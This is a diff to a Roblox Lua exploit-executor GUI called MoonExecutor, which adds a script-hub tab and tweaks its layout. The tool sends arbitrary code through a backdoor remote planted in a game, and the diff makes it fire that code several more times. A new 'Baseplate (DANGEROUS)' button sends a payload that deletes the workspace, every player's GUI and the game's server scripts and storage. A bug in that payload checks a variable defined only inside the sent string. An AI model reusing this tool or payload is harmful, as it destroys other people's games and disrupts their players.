@@ -9,13 +9,12 @@
 designed using localmaze gui creator
 ]=]
 
--- Instances: 23 | Scripts: 4 | Modules: 0 | Tags: 0
+-- Instances: 39 | Scripts: 7 | Modules: 0 | Tags: 0
 local LMG2L = {};
 
 -- Players.KHAFIDZKTP.PlayerGui.ScreenGui
 LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
 LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
-LMG2L["ScreenGui_1"]["ResetOnSpawn"] = false;
 
 
 -- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame
@@ -142,7 +141,7 @@ LMG2L["CoderBox_f"]["RichText"] = true;
 LMG2L["CoderBox_f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 LMG2L["CoderBox_f"]["MultiLine"] = true;
 LMG2L["CoderBox_f"]["PlaceholderText"] = [[Paste Your Script Here!]];
-LMG2L["CoderBox_f"]["Size"] = UDim2.new(0.84828, 0, 0.65922, 0);
+LMG2L["CoderBox_f"]["Size"] = UDim2.new(0, 438, 0, 236);
 LMG2L["CoderBox_f"]["Position"] = UDim2.new(0.08621, 0, 0.12291, 0);
 LMG2L["CoderBox_f"]["Text"] = [[Paste Your Script Here]];
 
@@ -205,6 +204,130 @@ LMG2L["MoonExecutor_17"]["Size"] = UDim2.new(0.78966, 0, 0.12849, 0);
 LMG2L["MoonExecutor_17"]["Text"] = [[MoonExecutor]];
 LMG2L["MoonExecutor_17"]["Name"] = [[MoonExecutor]];
 LMG2L["MoonExecutor_17"]["Position"] = UDim2.new(0.11379, 0, -0.00559, 0);
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame
+LMG2L["TabsFrame_18"] = Instance.new("Frame", LMG2L["MainFrame_c"]);
+LMG2L["TabsFrame_18"]["BorderSizePixel"] = 0;
+LMG2L["TabsFrame_18"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TabsFrame_18"]["Size"] = UDim2.new(0, 80, 0, 236);
+LMG2L["TabsFrame_18"]["Position"] = UDim2.new(0, 494, 0, 46);
+LMG2L["TabsFrame_18"]["Name"] = [[TabsFrame]];
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame.ScriptButton
+LMG2L["ScriptButton_19"] = Instance.new("TextButton", LMG2L["TabsFrame_18"]);
+LMG2L["ScriptButton_19"]["TextWrapped"] = true;
+LMG2L["ScriptButton_19"]["BorderSizePixel"] = 0;
+LMG2L["ScriptButton_19"]["TextScaled"] = true;
+LMG2L["ScriptButton_19"]["BackgroundColor3"] = Color3.fromRGB(102, 5, 255);
+LMG2L["ScriptButton_19"]["FontFace"] = Font.new([[rbxasset://fonts/families/AccanthisADFStd.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["ScriptButton_19"]["Size"] = UDim2.new(0, 60, 0, 50);
+LMG2L["ScriptButton_19"]["Text"] = [[ScriptHub]];
+LMG2L["ScriptButton_19"]["Name"] = [[ScriptButton]];
+LMG2L["ScriptButton_19"]["Position"] = UDim2.new(0, 10, 0, 22);
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame.ScriptButton.UICorner
+LMG2L["UICorner_1a"] = Instance.new("UICorner", LMG2L["ScriptButton_19"]);
+LMG2L["UICorner_1a"]["CornerRadius"] = UDim.new(0, 7);
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame.ScriptButton.switchscript
+LMG2L["switchscript_1b"] = Instance.new("LocalScript", LMG2L["ScriptButton_19"]);
+LMG2L["switchscript_1b"]["Name"] = [[switchscript]];
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame.UICorner
+LMG2L["UICorner_1c"] = Instance.new("UICorner", LMG2L["TabsFrame_18"]);
+
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame
+LMG2L["ScripthubFrame_1d"] = Instance.new("Frame", LMG2L["ScreenGui_1"]);
+LMG2L["ScripthubFrame_1d"]["Visible"] = false;
+LMG2L["ScripthubFrame_1d"]["BorderSizePixel"] = 0;
+LMG2L["ScripthubFrame_1d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["ScripthubFrame_1d"]["Size"] = UDim2.new(0, 592, 0, 348);
+LMG2L["ScripthubFrame_1d"]["Position"] = UDim2.new(0, 288, 0, 136);
+LMG2L["ScripthubFrame_1d"]["Name"] = [[ScripthubFrame]];
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame
+LMG2L["ScriptMainFrame_1e"] = Instance.new("Frame", LMG2L["ScripthubFrame_1d"]);
+LMG2L["ScriptMainFrame_1e"]["BorderSizePixel"] = 0;
+LMG2L["ScriptMainFrame_1e"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
+LMG2L["ScriptMainFrame_1e"]["Size"] = UDim2.new(0, 566, 0, 328);
+LMG2L["ScriptMainFrame_1e"]["Position"] = UDim2.new(0, 14, 0, 10);
+LMG2L["ScriptMainFrame_1e"]["Name"] = [[ScriptMainFrame]];
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.UICorner
+LMG2L["UICorner_1f"] = Instance.new("UICorner", LMG2L["ScriptMainFrame_1e"]);
+LMG2L["UICorner_1f"]["CornerRadius"] = UDim.new(0, 1);
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame
+LMG2L["ScrollingFrame_20"] = Instance.new("ScrollingFrame", LMG2L["ScriptMainFrame_1e"]);
+LMG2L["ScrollingFrame_20"]["BorderSizePixel"] = 0;
+LMG2L["ScrollingFrame_20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ScrollingFrame_20"]["Size"] = UDim2.new(0, 556, 0, 328);
+LMG2L["ScrollingFrame_20"]["BackgroundTransparency"] = 1;
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate
+LMG2L["Baseplate_21"] = Instance.new("TextButton", LMG2L["ScrollingFrame_20"]);
+LMG2L["Baseplate_21"]["TextWrapped"] = true;
+LMG2L["Baseplate_21"]["RichText"] = true;
+LMG2L["Baseplate_21"]["BorderSizePixel"] = 0;
+LMG2L["Baseplate_21"]["TextScaled"] = true;
+LMG2L["Baseplate_21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["Baseplate_21"]["BackgroundColor3"] = Color3.fromRGB(187, 187, 187);
+LMG2L["Baseplate_21"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["Baseplate_21"]["Size"] = UDim2.new(0, 94, 0, 42);
+LMG2L["Baseplate_21"]["Text"] = [[Baseplate (DANGEROUS)]];
+LMG2L["Baseplate_21"]["Name"] = [[Baseplate]];
+LMG2L["Baseplate_21"]["Position"] = UDim2.new(0, 12, 0, 64);
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate.UICorner
+LMG2L["UICorner_22"] = Instance.new("UICorner", LMG2L["Baseplate_21"]);
+LMG2L["UICorner_22"]["CornerRadius"] = UDim.new(0, 4);
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate.LocalScript
+LMG2L["LocalScript_23"] = Instance.new("LocalScript", LMG2L["Baseplate_21"]);
+
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.UIGradient
+LMG2L["UIGradient_24"] = Instance.new("UIGradient", LMG2L["ScriptMainFrame_1e"]);
+LMG2L["UIGradient_24"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 249)),ColorSequenceKeypoint.new(0.948, Color3.fromRGB(0, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 0, 0))};
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.CloseButton
+LMG2L["CloseButton_25"] = Instance.new("TextButton", LMG2L["ScriptMainFrame_1e"]);
+LMG2L["CloseButton_25"]["TextWrapped"] = true;
+LMG2L["CloseButton_25"]["BorderSizePixel"] = 0;
+LMG2L["CloseButton_25"]["TextScaled"] = true;
+LMG2L["CloseButton_25"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
+LMG2L["CloseButton_25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["CloseButton_25"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+LMG2L["CloseButton_25"]["BackgroundTransparency"] = 1;
+LMG2L["CloseButton_25"]["Size"] = UDim2.new(0, 46, 0, 32);
+LMG2L["CloseButton_25"]["Text"] = [[X]];
+LMG2L["CloseButton_25"]["Name"] = [[CloseButton]];
+LMG2L["CloseButton_25"]["Position"] = UDim2.new(0, 530, 0, -12);
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.CloseButton.CloseScript
+LMG2L["CloseScript_26"] = Instance.new("LocalScript", LMG2L["CloseButton_25"]);
+LMG2L["CloseScript_26"]["Name"] = [[CloseScript]];
+
+
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.UICorner
+LMG2L["UICorner_27"] = Instance.new("UICorner", LMG2L["ScripthubFrame_1d"]);
+
 
 
 -- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MenuInjectFrame.Scanning .ScanScript
@@ -307,7 +430,7 @@ local function C_5()
 			task.wait(0.5)	
 	
 			local hint = Instance.new("Hint")	
-			hint.Text = "Thanks for using my executor! | By KHAFIDZKTP | DISPLAYNAME YTZ_DEXZ"	
+			hint.Text = "Thanks for using my executor! | By KHAFIDZKTP | DisplayName YTZ_DEXZ"	
 			hint.Parent = player.Character	
 	
 			mainFrame.Visible = true	
@@ -405,6 +528,13 @@ local function C_15()
 			button.Text = "Running..."	
 			button.TextColor3 = Color3.fromRGB(255, 255, 0)	
 			runRemote(backdoor, code)	
+	
+	local maxRetry = 3	
+	for i = 1, maxRetry do	
+	    runRemote(backdoor, code)	
+	    task.wait(0.3)	
+	end	
+	
 			task.wait(0.5)	
 			button.Text = "Executed!"	
 			button.TextColor3 = Color3.fromRGB(0, 255, 0)	
@@ -459,5 +589,110 @@ local function C_16()
 	end)	
 end;
 task.spawn(C_16);
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.MainFrame.TabsFrame.ScriptButton.switchscript
+local function C_1b()
+	local script = LMG2L["switchscript_1b"];
+	local button = script.Parent	
+	local screenGui = button:FindFirstAncestorOfClass("ScreenGui")	
+	local mainFrame = screenGui:FindFirstChild("ScripthubFrame")	
+	local menuInjectFrame = screenGui:FindFirstChild("MainFrame")	
+	
+	button.MouseButton1Click:Connect(function()	
+		mainFrame.Visible = true	
+		menuInjectFrame.Visible = false	
+	end)	
+end;
+task.spawn(C_1b);
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.ScrollingFrame.Baseplate.LocalScript
+local function C_23()
+	local script = LMG2L["LocalScript_23"];
+	local button = script.Parent	
+	
+	button.MouseButton1Click:Connect(function()	
+		local backdoor = _G.MoonBackdoor	
+	
+		if not backdoor then	
+			warn("[MoonExecutor] No backdoor found!")	
+			return	
+		end	
+	
+		local code = [[	
+	-- 1. Hapus semua Workspace kecuali Baseplate & Terrain	
+	for _, obj in workspace:GetChildren() do	
+		if obj.Name ~= "Baseplate" and not obj:IsA("Terrain") then	
+			obj:Destroy()	
+		end	
+	end	
+	
+	-- 2. Hapus PlayerGui semua player	
+	for _, plr in game:GetService("Players"):GetPlayers() do	
+		for _, obj in plr.PlayerGui:GetChildren() do	
+			obj:Destroy()	
+		end	
+	end	
+	
+	-- 3. Hapus StarterGui	
+	for _, obj in game:GetService("StarterGui"):GetChildren() do	
+		obj:Destroy()	
+	end	
+	
+	-- 4. Hapus ReplicatedStorage	
+	for _, obj in game:GetService("ReplicatedStorage"):GetChildren() do	
+		obj:Destroy()	
+	end	
+	
+	-- 5. Hapus ServerScriptService	
+	for _, obj in game:GetService("ServerScriptService"):GetChildren() do	
+		obj:Destroy()	
+	end	
+	
+	-- 6. Hint permanen	
+	local hint = Instance.new("Hint")	
+	hint.Text = "WELCOME TO BASIC BASEPLATE"	
+	hint.Parent = workspace	
+	
+	-- 7. Spawn NPC YTZ_DEXZ dengan avatar KHAFIDZKTP	
+	local Players = game:GetService("Players")	
+	local spawnLocation = workspace:FindFirstChildOfClass("SpawnLocation")	
+	local spawnPos = spawnLocation and spawnLocation.Position or Vector3.new(0, 0, 0)	
+	
+	local ok, err = pcall(function()	
+		local userId = Players:GetUserIdFromNameAsync("KHAFIDZKTP")	
+		local description = Players:GetHumanoidDescriptionFromUserId(userId)	
+		local character = Players:CreateHumanoidModelFromDescription(description, Enum.HumanoidRigType.R6)	
+		character.Name = "YTZ_DEXZ"	
+		character:SetPrimaryPartCFrame(CFrame.new(spawnPos + Vector3.new(0, 5, 0)))	
+		character.Parent = workspace	
+	end)	
+	]]	
+	if not ok then	
+		warn("[MoonExecutor] NPC Error: " .. tostring(err))	
+	end	
+	
+	
+		if backdoor:IsA("RemoteEvent") then	
+			backdoor:FireServer(code)	
+		elseif backdoor:IsA("RemoteFunction") then	
+			task.spawn(function()	
+				backdoor:InvokeServer(code)	
+			end)	
+		end	
+	end)	
+end;
+task.spawn(C_23);
+-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.CloseButton.CloseScript
+local function C_26()
+	local script = LMG2L["CloseScript_26"];
+	local closeButton = script.Parent	
+	local screenGui = closeButton:FindFirstAncestorOfClass("ScreenGui")	
+	local Scripthubframe = screenGui:FindFirstChild("ScripthubFrame")	
+	local MainFrame = screenGui:FindFirstChild("MainFrame")	
+	
+	closeButton.MouseButton1Click:Connect(function()	
+		Scripthubframe.Visible = false	
+		MainFrame.Visible = true	
+	end)	
+end;
+task.spawn(C_26);
 
 return LMG2L["ScreenGui_1"], require;
